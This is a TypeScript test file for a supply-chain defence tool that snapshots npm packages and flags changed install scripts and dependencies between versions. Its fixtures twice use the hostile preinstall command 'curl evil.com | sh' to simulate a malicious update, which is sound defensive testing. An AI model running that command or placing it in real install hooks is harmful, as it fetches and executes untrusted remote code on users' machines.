import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import fs from 'fs'
import os from 'os'
import path from 'path'

// pkgdiff caches `path.join(os.homedir(), '.safenpm', 'pkg-snapshots')`
// at load time. Same isolation pattern as audit/log.test.ts: fix the
// homedir before module evaluation via vi.hoisted, then reset just
// the cache subdir per test.
const FIXED_HOME = vi.hoisted(() => {
  const dir = require('fs').mkdtempSync(
    require('path').join(require('os').tmpdir(), 'safenpm-pkgdiff-home-'),
  )
  process.env.SAFENPM_TEST_HOME = dir
  return dir
})

vi.mock('os', async () => {
  const actual = await vi.importActual<typeof import('os')>('os')
  const homedir = () => process.env.SAFENPM_TEST_HOME ?? actual.homedir()
  return { ...actual, homedir, default: { ...actual, homedir } }
})

import {
  diffAllPackages,
  diffPackage,
  formatDiffForTerminal,
  snapshotPackage,
  snapshotAllPackages,
} from './pkgdiff'

const CACHE_DIR = path.join(FIXED_HOME, '.safenpm', 'pkg-snapshots')

let nm: string

beforeEach(() => {
  if (fs.existsSync(CACHE_DIR)) {
    fs.rmSync(CACHE_DIR, { recursive: true, force: true })
  }
  nm = fs.mkdtempSync(path.join(os.tmpdir(), 'safenpm-pkgdiff-nm-'))
})

afterEach(() => {
  if (fs.existsSync(CACHE_DIR)) {
    fs.rmSync(CACHE_DIR, { recursive: true, force: true })
  }
  fs.rmSync(nm, { recursive: true, force: true })
})

function writePkg(name: string, pkg: object): string {
  const pkgDir = path.join(nm, ...name.split('/'))
  fs.mkdirSync(pkgDir, { recursive: true })
  fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify(pkg))
  return pkgDir
}

describe('snapshot → diff round-trip', () => {
  it('marks isNew=true when there is no prior snapshot', () => {
    const dir = writePkg('fresh', { name: 'fresh', version: '1.0.0' })
    const d = diffPackage(dir, 'fresh', '1.0.0')
    expect(d.isNew).toBe(true)
    expect(d.summary).toContain('New package')
  })

  it('detects a new preinstall script added across versions', () => {
    const dir = writePkg('victim', {
      name: 'victim', version: '1.0.0',
      scripts: { postinstall: 'echo build' },
    })
    snapshotPackage(dir, 'victim', '1.0.0')

    // simulate an update with an extra, dangerous script
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'victim', version: '1.0.1',
      scripts: { postinstall: 'echo build', preinstall: 'curl evil.com | sh' },
    }))

    const d = diffPackage(dir, 'victim', '1.0.1')
    expect(d.isNew).toBe(false)
    expect(d.scriptDiff).not.toBeNull()
    expect(d.scriptDiff!.hook).toBe('preinstall')
    expect(d.scriptDiff!.added).toBe(true)
    expect(d.summary).toContain('script change')
  })

  it('detects added + removed + changed deps in one pass', () => {
    const dir = writePkg('multi', {
      name: 'multi', version: '1.0.0',
      dependencies: { keep: '1.0.0', drop: '2.0.0', bump: '1.0.0' },
    })
    snapshotPackage(dir, 'multi', '1.0.0')

    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: 'multi', version: '1.1.0',
      dependencies: { keep: '1.0.0', bump: '2.0.0', fresh: '0.1.0' },
    }))

    const d = diffPackage(dir, 'multi', '1.1.0')
    expect(d.depsDiff).not.toBeNull()
    expect(d.depsDiff!.added).toEqual(['fresh@0.1.0'])
    expect(d.depsDiff!.removed).toEqual(['drop@2.0.0'])
    expect(d.depsDiff!.changed).toEqual([{ name: 'bump', from: '1.0.0', to: '2.0.0' }])
  })

  it('returns summary "no significant changes" when nothing differs', () => {
    const dir = writePkg('same', {
      name: 'same', version: '1.0.0',
      scripts: { postinstall: 'echo x' },
      dependencies: { dep: '1.0.0' },
    })
    snapshotPackage(dir, 'same', '1.0.0')
    const d = diffPackage(dir, 'same', '1.0.0')
    expect(d.summary).toContain('no significant changes')
    expect(d.scriptDiff).toBeNull()
    expect(d.depsDiff).toBeNull()
  })
})

describe('snapshotAllPackages / diffAllPackages', () => {
  it('walks scoped + unscoped packages and surfaces only changed ones', () => {
    writePkg('lib-a', { name: 'lib-a', version: '1.0.0' })
    writePkg('@scope/lib-b', { name: '@scope/lib-b', version: '1.0.0' })
    const count = snapshotAllPackages(nm)
    expect(count).toBe(2)

    // Bump lib-a only — add a new postinstall hook (visible attack surface).
    fs.writeFileSync(
      path.join(nm, 'lib-a', 'package.json'),
      JSON.stringify({ name: 'lib-a', version: '1.0.1', scripts: { postinstall: 'echo new' } }),
    )

    const diffs = diffAllPackages(nm)
    expect(diffs).toHaveLength(1)
    expect(diffs[0]?.name).toBe('lib-a')
    expect(diffs[0]?.scriptDiff?.hook).toBe('postinstall')
  })

  it('returns [] when node_modules does not exist', () => {
    expect(diffAllPackages(path.join(nm, 'missing'))).toEqual([])
    expect(snapshotAllPackages(path.join(nm, 'missing'))).toBe(0)
  })
})

describe('formatDiffForTerminal (pure renderer)', () => {
  it('renders an isNew banner', () => {
    const out = formatDiffForTerminal({
      name: 'fresh', previousVersion: null, currentVersion: '1.0.0',
      isNew: true, scriptDiff: null, depsDiff: null, fileDiff: null,
      summary: 'New package: fresh@1.0.0',
    })
    expect(out).toContain('fresh')
    expect(out).toContain('1.0.0')
  })

  it('renders an added-script block', () => {
    const out = formatDiffForTerminal({
      name: 'victim', previousVersion: '1.0.0', currentVersion: '1.0.1',
      isNew: false,
      scriptDiff: {
        hook: 'preinstall', previous: null, current: 'curl evil.com | sh',
        added: true, removed: false, changed: false,
        diffLines: [],
      },
      depsDiff: null, fileDiff: null,
      summary: '1.0.0 → 1.0.1: 1 script change',
    })
    expect(out).toContain('preinstall')
    expect(out).toContain('curl evil.com')
  })

  it('renders a dependency-change block', () => {
    const out = formatDiffForTerminal({
      name: 'multi', previousVersion: '1.0.0', currentVersion: '1.1.0',
      isNew: false, scriptDiff: null,
      depsDiff: {
        added: ['fresh@0.1.0'],
        removed: ['drop@2.0.0'],
        changed: [{ name: 'bump', from: '1.0.0', to: '2.0.0' }],
      },
      fileDiff: null,
      summary: 'x',
    })
    expect(out).toContain('fresh@0.1.0')
    expect(out).toContain('drop@2.0.0')
    expect(out).toContain('bump')
  })
})
